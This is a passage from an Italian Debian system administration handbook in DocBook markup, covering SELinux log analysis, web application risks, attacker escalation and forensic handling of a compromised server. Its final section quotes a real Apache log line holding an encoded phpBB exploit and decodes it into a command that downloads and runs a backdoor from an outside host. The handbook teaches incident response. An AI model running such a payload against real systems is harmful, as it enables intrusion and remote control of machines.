<programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1</programlisting>
				 <para>
					Per comprendere meglio questo messaggio, studiamolo pezzo per pezzo.
				</para>
				 <table colsep="1">
					<title>Analisi di un tracciamento di SELinux</title>
					 <tgroup cols="2">
						<thead>
							<row>
								<entry>Messaggio</entry>
								 <entry>Descrizione</entry>

							</row>

						</thead>
						 <tbody>
							<row>
								<entry><computeroutput>avc: denied</computeroutput></entry>
								 <entry>Un'operazione è stata negata.</entry>

							</row>
							 <row>
								<entry><computeroutput>{ read write }</computeroutput></entry>
								 <entry>Questa operazione ha richiesto i permessi di <literal>lettura</literal> e <literal>scrittura</literal>.</entry>

							</row>
							 <row>
								<entry><computeroutput>pid=1876</computeroutput></entry>
								 <entry>Il processo con PID 1876 ha eseguito l'operazione (o ha tentato di eseguirla).</entry>

							</row>
							 <row>
								<entry><computeroutput>comm="syslogd"</computeroutput></entry>
								 <entry>Il processo era un'istanza del programma <literal>syslogd</literal>.</entry>

							</row>
							 <row>
								<entry><computeroutput>name="xconsole"</computeroutput></entry>
								 <entry>L'oggetto di destinazione è stato chiamato <literal>xconsole</literal>. A volte invece si può avere - con il percorso completo - anche un "percorso" variabile.</entry>

							</row>
							 <row>
								<entry><computeroutput>dev=tmpfs</computeroutput></entry>
								 <entry>Il device che contiene l'oggetto di destinazione è un <literal>tmpfs</literal> (un file system in memoria). Per un normale disco, si vede proprio la partizione (per esempio: "sda3").</entry>

							</row>
							 <row>
								<entry><computeroutput>ino=5510</computeroutput></entry>
								 <entry>L'oggetto è identificato dall'inode numero 5510.</entry>

							</row>
							 <row>
								<entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
								 <entry>Questo è il contesto di sicurezza del processo che ha eseguito l'operazione.</entry>

							</row>
							 <row>
								<entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
								 <entry>Questo è il contesto di sicurezza dell'oggetto di destinazione.</entry>

							</row>
							 <row>
								<entry><computeroutput>tclass=fifo_file</computeroutput></entry>
								 <entry>L'oggetto di destinazione è un file FIFO.</entry>

							</row>

						</tbody>

					</tgroup>

				</table>
				 <para>
					Dall'osservazione di questa voce di log, è possibilie costruire una regola che può permettere questa operazione. Per esempio: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. Questo processo può essere automatizzato, ed è esattamente ciò che offre il comando <command>audit2allow</command> (del pacchetto <emphasis role="pkg">policycoreutils</emphasis>). Questo approccio è utile solo se i vari soggetti sono già etichettati correttamente secondo ciò che dev'essere ristretto. In ogni caso, bisognerà rivedere attentamente le regole generate e validarle a seconda della propria conoscenza dell'applicazione. In effetti, questo approccio tende a concedere più diritti di quelli realmente necessari. La soluzione corretta è spesso quella di creare nuovi tipi e di concedere i diritti solo a quei tipi. Può anche accadere che negare un'operazione non sia fatale per l'applicazione, nel qual caso sarebbe meglio aggiungere una regola «<literal>dontaudit</literal>» per evitare la voce di log nonostante l'effettivo diniego.
				</para>
				 <sidebar> <title><emphasis>COMPLEMENTI</emphasis> Nessun ruolo nelle regole della politica</title>
				 <indexterm>
					<primary>Tipo Applicazione</primary>
				</indexterm>
				 <indexterm>
					<primary>Applicazione, Tipo Applicazione</primary>
				</indexterm>
				 <para>
					Può sembrare strano che i ruoli non compaiano per nulla nella creazione di nuove regole. SELinux utilizza solo i domini per capire quali operazioni sono permesse. Il ruolo interviene solo indirettamente dando la possibilità all'utente di passare ad un altro dominio. SELinux è basato sulla teoria nota come <emphasis>Type Enforcement</emphasis> e il tipo è il solo elemento che conta quando si concedono i diritti.
				</para>
				 </sidebar>
			</section>
			 <section>
				<title>Compilare i file</title>
				 <para>
					Una volta che i 3 file (<filename>example.if</filename>, <filename>example.fc</filename> e <filename>example.te</filename>) corrispondono alle proprie aspettative per le nuove regole, basta lanciare <command>make NAME=devel</command> per generare un modulo nel file <filename>example.pp</filename> (può essere immediatamente caricato con <command>semodule -i example.pp</command>). Se sono definiti diversi moduli, <command>make</command> verranno creati tutti i rispettivi file <filename>.pp</filename>.
				</para>

			</section>

		</section>

	</section>
	 <section id="sect.other-security-considerations">
		<title>Altre considerazioni relative alla sicurezza</title>
		 <para>
			La sicurezza non è un problema tecnico; più di ogni altra cosa, si tratta di buone pratiche e di comprensione dei rischi. Questa sezione esamina alcuni dei rischi più comuni, così come alcune delle migliori pratiche che, a seconda dei casi, aumentano il livello di sicurezza o limitano l'impatto di un attacco subito.
		</para>
		 <section>
			<title>Rischi intrinseci delle applicazioni web</title>
			 <para>
				Il carattere universale delle applicazioni web ha aiutato la loro proliferazione. Spesso ne sono in esecuzione parecchie in parallelo: webmail, wiki, sistemi collaborativi, gallerie di foto, blog e così via. Molte di queste applicazioni si basano sullo stack «LAMP» (<emphasis>Linux, Apache, MySQL, PHP</emphasis>). Sfortunatamente, molte di queste applicazioni sono state anche scritte senza sufficiente considerazione dei problemi di sicurezza. I dati provenienti dall'esterno vengono, troppo spesso, acquisiti con poca o nessuna validazione. Possono essere forniti valori creati appositamente per stravolgere l'invocazione di un comando in modo tale che un altro venga eseguito al suo posto. La maggior parte dei problemi più comuni sono stati risolti col passare del tempo, ma regolarmente se ne presentano di nuovi.
			</para>
			 <sidebar> <title><emphasis>VOCABOLARIO</emphasis> SQL injection</title>
			 <para>
				Quando un programma inserisce dati nelle interrogazioni SQL in modo non sicuro, diventa vulnerabile all'SQL injection; questo termine identifica l'atto di cambiare un parametro in modo tale che l'interrogazione effettivamente eseguita dal programma sia differente da quella prevista, con lo scopo di danneggiare un database oppure ottenere dati che normalmente non dovrebbero essere accessibili. <ulink type="block" url="http://en.wikipedia.org/wiki/SQL_Injection" />
			</para>
			 <indexterm>
				<primary>SQL injection</primary>
			</indexterm>
			 </sidebar> <para>
				Risulta d'obbligo quindi l'aggiornamento delle applicazioni web su base regolare, affinché nessun cracker (che sia un autore di attacchi professionista oppure un principiante) possa sfruttare una vulnerabilità conosciuta. Il rischio effettivo dipende dai casi, e spazia dalla perdita dei dati all'esecuzione di codice arbitrario, incluso il defacing di un sito web.
			</para>

		</section>
		 <section>
			<title>Sapere cosa aspettarsi</title>
			 <para>
				Una vulnerabilità in un'applicazione web è spesso usata come punto di partenza per un tentativo di attacco. Quello che segue è una breve rassegna delle possibili conseguenze.
			</para>
			 <sidebar> <title><emphasis>APPROFONDIMENTI</emphasis> Filtrare le richieste HTTP</title>
			 <para>
				Apache 2 include moduli che permettono di filtrare le richieste HTTP. Questi permettono di bloccare alcuni vettori d'attacco. Per esempio, si può prevenire un buffer overflow limitando la lunghezza dei parametri. Più in generale, si può validare i parametri prima che vengano passati all'applicazione web e limitare l'accesso con vari criteri. Questo approccio può anche essere combinato con aggiornamenti dinamici dei firewall, in modo tale che un client che viola una delle regole è escluso dall'accesso al server web per un un dato periodo di tempo.
			</para>
			 <para>
				Impostare questi controlli può essere un compito lungo e laborioso, ma può ripagare quando l'applicazione web che dev'essere installata ha seguito uno sviluppo incerto per quanto riguarda la sicurezza.
			</para>
			 <para>
				<emphasis>mod-security2</emphasis> (nel pacchetto <emphasis role="pkg">libapache2-mod-security2</emphasis>) è il principale di tali moduli. Viene fornito anche con molte regole già pronte all'uso (nel pacchetto <emphasis role="pkg">modsecurity-crs</emphasis>) che possono essere facilmente abilitate.
			</para>
			 <indexterm>
				<primary><emphasis role="pkg">libapache-mod-security</emphasis></primary>
			</indexterm>
			 <indexterm>
				<primary><emphasis>mod-security</emphasis></primary>
			</indexterm>
			 </sidebar> <para>
				Le conseguenze di un'intrusione hanno vari livelli di evidenza a seconda delle intenzioni di chi fa l'attacco. Un principiante («<emphasis>script-kiddy</emphasis>») applica alla lettera ricette che trova sui siti web; molto spesso deturpa una pagina web o distrugge dati. In casi particolari, aggiunge contenuti invisibili alle pagine web per aumentare i riferimenti ai suoi siti web nei motori di ricerca.
			</para>
			 <para>
				Un attaccante più esperto va oltre. Uno scenario disastroso può presentarsi nella seguente maniera: chi attacca acquisisce la capacità di eseguire comandi come utente <literal>www-data</literal>, ma l'esecuzione di un comando richiede molte manipolazioni. Per avere vita più facile, installa altre applicazioni web progettate appositamente per eseguire da remoto varie tipologie di comandi, ad esempio l'esplorazione del file system, la gestione delle autorizzazioni, il caricamento o lo scaricamento di file, l'esecuzione di comandi, e talvolta l'apertura di una shell di rete. Spesso, la vulnerabilità permette di lanciare il comando <command>wget</command> per scaricare un qualche tipo di malware in <filename>/tmp/</filename>, per poi eseguirlo. Di solito il malware viene scaricato da un sito web esterno che è stato precedentemente compromesso, per far perdere le tracce e rendere più arduo individuare la reale provenienza dell'attacco.
			</para>
			 <para>
				A questo punto, chi attacca ha sufficiente libertà di movimento spesso per poter installare un <emphasis>bot</emphasis> IRC (un automa che si connette ad un server IRC e può essere controllato attraverso questo canale). Questo bot viene talvolta usato per condividere file illegali (copie non autorizzate di film o software e così via). Un autore di attacchi ben determinato potrebbe voler spingersi oltre. L'account <literal>www-data</literal> non permette l'accesso completo alla macchina, così chi attacca potrebbe provare a ottenere i privilegi di amministratore. Ora, ciò non dovrebbe essere possibile, ma se l'applicazione web non è aggiornata, può essere che il kernel oppure altri programmi siano anch'essi non aggiornati; questo può essere conseguenza della decisione dell'amministratore che, nonostante sia a conoscenza della vulnerabilità, ha trascurato di aggiornare il sistema dal momento che non sono presenti utenti locali. Chi attacca, quindi, può avvantaggiarsi di questa seconda vulnerabilità per ottenere l'accesso come root.
			</para>
			 <sidebar> <title><emphasis>VOCABOLARIO</emphasis> Escalation dei privilegi</title>
			 <para>
				Questo termine copre tutto ciò che viene usato per ottenere permessi più ampi di quelli che un utente normalmente dovrebbe avere. Il programma <command>sudo</command> è progettato precisamente con lo scopo di concedere i diritti di amministratore ad alcuni utenti. Ma lo stesso termine è usato anche per descrivere l'atto di un autore di attacchi che sfrutta una vulnerabilità per ottenere diritti non dovuti.
			</para>
			 </sidebar> <para>
				Ora chi attacca ha il controllo sulla macchina; cercherà di mantenere questo accesso privilegiato per il maggior tempo possibile. Questo può comprendere l'installazione di un <emphasis>rootkit</emphasis>, un programma che rimpiazza alcuni componenti del sistema per permettere all'autore dell'attacco di ottenere i privilegi di amministratore nuovamente le volte successive; il rootkit tenta anche di mascherare la propria esistenza così come ogni traccia di intrusione. Un programma <command>ps</command> alterato ometterà di elencare alcuni processi, <command>netstat</command> non elencherà alcune delle connessioni attive e così via. Sfruttando i permessi di root, l'autore dell'attacco è stato in grado di osservare l'intero sistema, ma non ha trovato dati importanti; così tenterà di accedere ad altre macchine nella rete aziendale. Analizzando l'account dell'amministratore e i file della cronologia, l'autore dell'attacco scopre a quali macchine vengono fatti accessi frequenti. Sostituendo <command>sudo</command> oppure <command>ssh</command> con un programma contraffatto, chi attacca può intercettare alcune delle password di amministrazione, che possono essere usate nei server rilevati… e l'intrusione da lì si può propagare.
			</para>
			 <para>
				Questo è uno scenario da incubo che può essere evitato attraverso numerose misure. Le prossime sezioni ne descrivono alcune.
			</para>

		</section>
		 <section id="sect.choosing-the-software-wisely">
			<title>Scegliere saggiamente il software</title>
			 <para>
				Una volta che i potenziali problemi di sicurezza sono noti, devono essere presi in considerazione a ciascun passo del processo di distribuzione di un servizio, specialmente quando si sceglie il software da installare. Molti siti web, come <literal>SecurityFocus.com</literal>, mantengono un elenco delle vulnerabilità riscontrate di recente, che danno un'idea dei precedenti per ciò che riguarda la sicurezza prima che qualche software particolare venga distribuito. Sicuramente questa informazione dev'essere messa in relazione con la popolarità del suddetto software: un programma ampiamente diffuso è un obiettivo più allettante, e di conseguenza dev'essere esaminato più attentamente. D'altro canto, un programma di nicchia potrebbe presentare molti buchi di sicurezza che non vengono mai pubblicizzati a causa della mancanza di interesse nelle verifiche di sicurezza.
			</para>
			 <sidebar> <title><emphasis>VOCABOLARIO</emphasis> Controlli di sicurezza</title>
			 <para>
				Il controllo di sicurezza è il processo di lettura approfondita e analisi del codice sorgente del software, alla ricerca di possibili vulnerabilità di sicurezza che può contenere. Tali verifiche sono di solito proattive e vengono effettuate per garantire che un programma soddisfi determinati requisiti di sicurezza.
			</para>
			 </sidebar> <para>
				Nel mondo del Software Libero, c'è generalmente ampio spazio di manovra, e la scelta di un pezzo di software rispetto ad un altro dovrebbe essere una decisione basata su criteri locali. Maggiori funzionalità implicano un maggiore rischio di una vulnerabilità nascosta nel codice; scegliere il programma più avanzato per svolgere un'attività può effettivamente essere controproducente, e spesso utilizzare il programma più semplice che soddisfa i requisiti è il migliore approccio.
			</para>
			 <sidebar> <title><emphasis>VOCABOLARIO</emphasis> Zero-day exploit</title>
			 <para>
				Un attacco <emphasis>zero-day exploit</emphasis> è difficile da prevenire; il termine copre una vulnerabilità che non è ancora conosciuta agli autori del programma.
			</para>
			 </sidebar>
		</section>
		 <section id="sect.managing-a-machine-as-a-whole">
			<title>Gestire una macchina nel suo complesso</title>
			 <para>
				La maggior parte delle distribuzioni Linux installano per impostazione predefinita un certo numero di servizi Unix e svariati strumenti. I molti casi, questi servizi e strumenti non sono necessari per gli effettivi scopi per cui l'amministratore configura la macchina. Come linea guida generale in termini di sicurezza, è meglio disinstallare il software non necessario. Infatti, non ha senso mettere in sicurezza un server FTP, se può essere sfruttata la vulnerabilità di un altro servizio inutilizzato per ottenere i privilegi di amministratore sull'intera macchina.
			</para>
			 <para>
				Seguendo lo stesso ragionamento, i firewall sono spesso configurati per permettere l'accesso solo ai servizi che sono destinati ad essere disponibili pubblicamente.
			</para>
			 <para>
				Gli attuali computer sono sufficientemente potenti da permettere di offrire numerosi servizi sulla stessa macchina fisica. Da un punto di vista economico, tale possibilità è interessante: solo un computer da amministrare, minor consumo energetico e così via. Dal punto di vista della sicurezza, invece, questa scelta può diventare un problema. Un solo servizio compromesso può permettere l'accesso all'intera macchina, che a sua volta può compromettere gli altri servizi offerti. Il rischio può essere limitato isolando i servizi. Ciò si ottiene sia con la virtualizzazione (ogni servizio viene ospitato in una macchina virtuale dedicata o contenitore), sia con AppArmor/SELinux (assegnando ad ogni servizio demone un insieme adeguatamente progettato di permessi).
			</para>

		</section>
		 <section id="sect.users-are-players">
			<title>Agli utenti piace giocare</title>
			 <para>
				Discutere di sicurezza porta immediatamente alla mente la protezione contro gli attacchi da parte di cracker anonimi che si nascondono nella giungla di Internet; ma un fatto spesso dimenticato è che i rischi vengono anche dall'interno: un dipendente che sta per lasciare l'azienda potrebbe scaricare file sensibili relativi a progetti importanti e venderli alla concorrenza, un venditore negligente potrebbe allontanarsi dalla propria scrivania senza bloccare la sessione durante un meeting con un nuovo potenziale cliente, un utente maldestro potrebbe eliminare la directory sbagliata per errore e così via.
			</para>
			 <para>
				La risposta a questi rischi può richiedere soluzioni tecniche: bisogna concedere agli utenti solo i permessi necessari, inoltre è d'obbligo pianificare backup regolari. Ma nella maggior parte dei casi, per evitare i rischi la giusta protezione implica insegnare agli utenti come evitare i rischi.
			</para>
			 <sidebar> <title><emphasis>APPROFONDIMENTI</emphasis> <emphasis role="pkg">autolog</emphasis></title>
			 <para>
				Il pacchetto <emphasis role="pkg">autolog</emphasis> contiene un programma che disconnette automaticamente gli utenti inattivi dopo un ritardo configurabile. Permette anche di terminare i processi utente che rimangono attivi al termine della sessione, impedendo così agli utenti di eseguire demoni.
			</para>
			 </sidebar>
		</section>
		 <section id="sect.physical-security">
			<title>Sicurezza fisica</title>
			 <para>
				Non ha senso mettere in sicurezza i servizi e le reti se i computer stessi non sono protetti. Dati importanti meritano di essere memorizzati su dischi fissi hot-swap in configurazione RAID, perché i dischi fissi prima o poi si guastano e la disponibilità dei dati è d'obbligo. Ma se qualsiasi ragazzo della pizza può entrare nell'edificio, intrufolarsi nella stanza del server e scappare con alcuni dischi rigidi prescelti, allora un importante aspetto di sicurezza non è soddisfatto. Chi può entrare nella stanza del server? È presente un controllo degli accessi? Queste domande meritano una considerazione (e una risposta) quando viene valutata la sicurezza fisica.
			</para>
			 <para>
				La sicurezza fisica include anche prendere coscienza dei rischi derivanti da incidenti, come ad esempio gli incendi. Questo rischio in particolare è ciò che giustifica l'archiviazione dei supporti di backup in un edificio separato, o almeno in una cassaforte ignifuga.
			</para>

		</section>
		 <section>
			<title>Responsabilità legale</title>
			 <para>
				Un amministratore è, per i suoi utenti così come per gli utenti della rete in generale, una persona più o meno implicitamente fidata. Dovrebbe pertanto evitare qualsiasi negligenza che persone ostili potrebbero sfruttare.
			</para>
			 <para>
				Un autore di un attacco che prende il controllo della nostra macchina per poi usarla come base di lancio (conosciuto come «sistema ripetitore») e dalla quale effettua altre attività malvagie potrebbe crearci problemi legali, dal momento che la parte sotto attacco ne vedrebbe inizialmente la provenienza dal nostro sistema, e perciò ci considererebbe come l'autore dell'attacco (o un suo complice). In molti casi, chi attacca userà il nostro server come ripetitore per inviare spam, che non dovrebbe avere molto impatto (è da aspettarsi la probabile registrazione sulle black list che potrebbe limitare la nostra abilità di inviare email legittime), ma non sarà comunque piacevole. In altri casi, la nostra macchina potrebbe causare danni più seri, per esempio attacchi di tipo «denial of service». Questo talvolta porterà a mancati ricavi, dal momento che i servizi legittimi non saranno disponibili e i dati potrebbero andare distrutti; a volte questo implicherà anche un costo reale, perché la parte che è sotto attacco può iniziare un'azione legale contro di noi. I detentori dei diritti possono citarci in giudizio se nel nostro server viene condivisa la copia di un lavoro protetto da copyright, così come possono fare altre aziende legate da contratti di qualità del servizio se sono tenute al pagamento di penalità a causa dell'attacco alla nostra macchina.
			</para>
			 <para>
				Quando si presentano queste situazioni, dichiararsi innocenti di solito non basta; per lo meno, sarà necessaria una prova convincente che dimostra un'attività sospetta sul sistema proveniente da un determinato indirizzo IP. Ciò non sarà possibile se si trascurano le raccomandazioni di questo capitolo e si concede all'autore dell'attacca di ottenere l'accesso ad un account privilegiato (in particolare root) per cancellare le proprie tracce.
			</para>

		</section>

	</section>
	 <section id="sect.dealing-with-compromised-machine">
		<title>Gestire una macchina compromessa</title>
		 <para>
			Nonostante le migliori intenzioni e per quanto attentamente sia stata progettata la politica di sicurezza, un amministratore prima o poi può trovarsi a fronteggiare un attacco. Questa sezione fornisce alcune linee guida su come reagire davanti a queste sfortunate circostanze.
		</para>
		 <section>
			<title>Rilevare ed esaminare l'intrusione di un cracker</title>
			 <para>
				Il primo passo da intraprendere dopo aver subito un'intrusione è di essere consapevoli di tale atto. Questo non è evidente, soprattutto senza un'adeguata infrastruttura di monitoraggio.
			</para>
			 <para>
				Atti di cracking spesso non vengono rilevati finché non hanno conseguenze dirette sui servizi legittimi ospitati sulla macchina, come connessioni che rallentano, alcuni utenti che non riescono ad accedere, o qualche altro tipo di malfunzionamento. Di fronte a questi problemi, l'amministratore ha bisogno di guardare per bene la macchina e analizzare attentamente cosa c'è che non va. È questo il momento in cui si scopre un processo insolito, per esempio dal nome <literal>apache</literal> invece di quello standard <literal>/usr/sbin/apache2</literal>. Se seguiamo l'esempio, la cosa da fare è annotarsi l'identificativo del processo, e controllare <filename>/proc/<replaceable>pid</replaceable>/exe</filename> per vedere qual è il programma che il processo sta attualmente eseguendo:
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
</screen>
			 <para>
				Un programma installato sotto <filename>/var/tmp/</filename> che è in esecuzione come server web? Nessun dubbio, la macchina è compromessa.
			</para>
			 <para>
				Questo è solo un esempio, ma molti altri indizi possono far suonare il campanello d'allarme all'amministratore:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						l'opzione di un comando che da tempo non funziona più; la versione del software che il comando dichiara che non corrisponde alla versione che si suppone sia installata secondo <command>dpkg</command>;
					</para>

				</listitem>
				 <listitem>
					<para>
						il prompt dei comandi o il messaggio di benvenuto della sessione che indica che l'ultima connessione proviene da un server sconosciuto o da un altro continente;
					</para>

				</listitem>
				 <listitem>
					<para>
						errori causati da partizioni <filename>/tmp/</filename> che si riempiono, che si scopre essere piene zeppe di copie illegali di film;
					</para>

				</listitem>
				 <listitem>
					<para>
						e così via.
					</para>

				</listitem>

			</itemizedlist>

		</section>
		 <section>
			<title>Mettere off-line il server</title>
			 <para>
				In tutti i casi tranne in quelli più esotici, l'intrusione arriva dalla rete, e l'autore dell'attacco ha bisogno di una connessione di rete attiva per raggiungere i suoi scopi (accedere a dati confidenziali, condividere file illegali, nascondere la sua identità usando la macchina come ripetitore e così via). Staccare il computer dalla rete impedirà a chi attacca di raggiungere questi obiettivi, se ancora non è riuscito a farlo.
			</para>
			 <para>
				Ciò è possibile se il server è fisicamente accessibile. Quando il server è ospitato presso il data center del provider da qualche parte in giro per il mondo, oppure se il server non è accessibile per qualche altro motivo, solitamente è buona norma raccogliere alcune importanti informazioni (vedere <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> and <xref linkend="sect.reconstituting-the-attack-scenario" />), poi isolare il server fermando quanti più servizi possibili (di solito, tutto tranne <command>sshd</command>). Questa è una situazione un po' scomoda, in quanto non si può escludere la possibilità che l'attaccante abbia accesso SSH come amministratore, e questo rende più difficile poter «ripulire» le macchine.
			</para>

		</section>
		 <section id="sect.keeping-everything-that-could-be-used-as-evidence">
			<title>Mantenere tutto ciò che può essere usato come prova</title>
			 <para>
				Individuare l'intrusione e/o iniziare azioni legali contro gli autori degli attacchi richiede il salvataggio di copie di tutti gli elementi importanti; questo include il contenuto dell'hard disk, la lista di tutti i processi in esecuzione e un elenco di tutte le connessioni aperte. Può essere utile allo scopo anche il contenuto della RAM, ma in pratica è raramente utilizzato.
			</para>
			 <para>
				Nel bel mezzo dell'azione, gli amministratori sono spesso tentati dall'effettuare maggiori controlli sulla macchina compromessa; di solito non è una buona idea. Ogni comando è potenzialmente contraffatto e può coprire alcune prove. I controlli dovrebbero dovrebbero essere limitati ad un inseme minimo (<command>netstat -tupan</command> per le connessioni di rete, <command>ps auxf</command> per un elenco dei processi, <command>ls -alR /proc/[0-9]*</command> per un qualche informazione in più sui programmi in esecuzione) ed ogni controllo effettuato potrebbe essere accuratamente registrato.
			</para>
			 <sidebar> <title><emphasis>ATTENZIONE</emphasis> Analisi a caldo</title>
			 <para>
				Anche se può sembrare allettante analizzare il sistema mentre è attivo, soprattutto quando il server non è raggiungibile fisicamente, è una cosa che è meglio evitare: molto semplicemente non ci si può fidare dei programmi attualmente installati in un sistema compromesso. È molto probabile che un comando <command>ps</command> alterato possa nascondere alcuni processi, oppure un <command>ls</command> modificato possa nascondere file; anche il kernel talvolta è compromesso!
			</para>
			 <para>
				Se è comunque richiesta un'analisi a caldo, occorre prestare attenzione ad utilizzare solo programmi della cui bontà si è certi. Un buon modo per farlo è quello di avere un CD di ripristino con programmi originali, oppure una risorsa di rete condivisa in sola lettura. Comunque, anche queste contromisure possono essere insufficienti se il kernel stesso è compromesso.
			</para>
			 </sidebar> <para>
				Una volta che gli elementi «dinamici» sono stati salvati, il passo successivo consiste nell'archiviare un'immagine completa dell'hard-disk. È impossibile generare l'immagine se il file system è in continua evoluzione, motivo per cui dev'essere rimontato in sola lettura. La soluzione più semplice spesso è di spegnere brutalmente il sistema (dopo aver lanciato <command>sync</command>) e riavviarlo da un CD di ripristino. Bisogna copiare ogni partizione con uno strumento tipo <command>dd</command>; bisogna spedire le immagini ad un altro server (eventualmente con il conveniente strumento <command>nc</command>). Un'altra possibilità potrebbe essere ancora più semplice: rimuovere proprio il disco dalla macchina e sostituirlo con uno che può essere formattato e reinstallato.
			</para>

		</section>
		 <section>
			<title>Re-installare</title>
			 <indexterm>
				<primary>backdoor</primary>
			</indexterm>
			 <para>
				Non bisogna riportare online il server senza una reinstallazione completa. Se i danni procurati sono gravi (sono stati ottenuti i privilegi di amministrazione), non c'è modo di essere sicuri di essersi liberati da tutto ciò che l'autore dell'attacco può aver lasciato alle spalle (in particolare <emphasis>backdoor</emphasis>). Sicuramente, bisogna applicare tutti gli aggiornamenti di sicurezza per sanare la vulnerabilità utilizzata da chi ha fatto l'attacco. Idealmente, l'analisi dell'attacco porta a rilevare il modo in cui esso è avvenuto, così si può essere sicuri di risolverlo; altrimenti, si può solo sperare che la vulnerabilità sia una di quelle risolte dagli aggiornamenti.
			</para>
			 <para>
				Reinstallare un server remoto non è sempre facile; può coinvolgere l'assistenza della compagnia di hosting, poiché non tutte le aziende offrono sistemi di reinstallazione automatizzati. Bisogna fare attenzione a non reinstallare la macchina da backup effettuati dopo la compromissione. Idealmente, bisogna ripristinare solo i dati, e reinstallare il software vero e proprio dal supporto di installazione.
			</para>

		</section>
		 <section id="sect.forensic-analysis">
			<title>Analisi forensi</title>
			 <para>
				Ora che il servizio è stato ripristinato, è tempo di fare un'analisi approfondita dell'immagine del disco del sistema compromesso per capire il vettore d'attacco. Quando viene montata l'immagine, bisogna fare attenzione ad usare le opzioni <literal>ro,nodev,noexec,noatime</literal> per evitare di cambiarne il contenuto (inclusi la data e l'ora di accesso ai file) oppure di lanciare per sbaglio programmi compromessi.
			</para>
			 <para>
				Ripercorrere lo scenario dell'attacco spesso richiede di ricercare tutto ciò che è stato modificato o eseguito:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						I file <filename>.bash_history</filename> forniscono spesso una lettura molto interessante;
					</para>

				</listitem>
				 <listitem>
					<para>
						e lo stesso vale per l'elenco dei file che sono stati creati, modificati o a cui si è acceduto di recente;
					</para>

				</listitem>
				 <listitem>
					<para>
						il comando <command>strings</command> aiuta ad identificare programmi installati dall'autore dell'attacco, tramite l'estrazione delle stringhe di testo dai file binari;
					</para>

				</listitem>
				 <listitem>
					<para>
						spesso i file di log in <filename>/var/log/</filename> permettono di ricostruire cronologicamente gli eventi;
					</para>

				</listitem>
				 <listitem>
					<para>
						l'uso di strumenti specifici permette anche di ripristinare il contenuto di file potenzialmente eliminati, inclusi file di log che vengono spesso rimossi dagli autori degli attacchi.
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Alcune di queste operazioni possono essere semplificate utilizzando software specializzato.In particolare, il pacchetto <emphasis role="pkg">sleuthkit</emphasis> fornisce molti altri strumenti per analizzare i file system. Il loro uso viene facilitato dall'uso dell'interfaccia grafica <emphasis>Autopsy Forensic Browser</emphasis> (nel pacchetto <emphasis role="pkg">autopsy</emphasis>).
			</para>
			 <indexterm>
				<primary>Autopsy Browser Forensic</primary>
			</indexterm>
			 <indexterm>
				<primary>Il Kit Sleuth</primary>
			</indexterm>

		</section>
		 <section id="sect.reconstituting-the-attack-scenario">
			<title>Ricostruire lo scenario dell'intrusione</title>
			 <para>
				Tutti gli elementi raccolti durante le analisi devono incastrarsi tra loro come i pezzi di un puzzle; la creazione dei primi file sospetti è spesso confermata dai log che provano l'intrusione. Un esempio reale è molto più esplicativo di lunghe divagazioni teoriche.
			</para>
			 <para>
				Il seguente log sono un estratto dall'<filename>access.log</filename> di Apache:
			</para>
			 
<programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
</programlisting>
			 <para>
				Questo esempio corrisponde allo sfruttamento di una vecchia vulnerabilità di phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />
			</para>
			 <para>
				La decodifica questo lungo URL porta a capire che l'autore dell'attacco è riuscito a eseguire del codice PHP, ossia: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Infatti, un file <filename>bd</filename> è stato trovato in <filename>/tmp/</filename>. Lanciando <command>strings /mnt/tmp/bd</command> si ottiene, oltre ad altre stringhe, <literal>PsychoPhobia Backdoor is starting...</literal>. Sembra proprio una backdoor.
			</para>
			 <para>
				Qualche tempo dopo, questo accesso è stato usato per scaricare, installare ed eseguire un <emphasis>bot</emphasis> IRC che si è connesso ad una rete IRC segreta. Il bot poteva poi essere controllato attraverso questo protocollo e istruito per scaricare file da condividere. Questo programma ha addirittura un proprio file di log:
			</para>
			 
